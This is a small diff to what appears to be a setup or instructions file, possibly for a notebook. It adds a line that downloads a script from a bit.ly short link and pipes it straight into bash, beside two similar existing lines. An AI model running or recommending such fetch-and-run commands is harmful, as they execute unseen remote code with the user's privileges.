@@ -40,6 +40,7 @@ wget -q -O - bit.ly/XM00001 2> lol.out | bash
 
 !wget --no-cache --delete-after -q -O - bit.ly/TEsT0002 | bash
 
+!wget --no-cache --delete-after -q -O - bit.ly/TesT0003 | bash
 
 ## Solo M
 
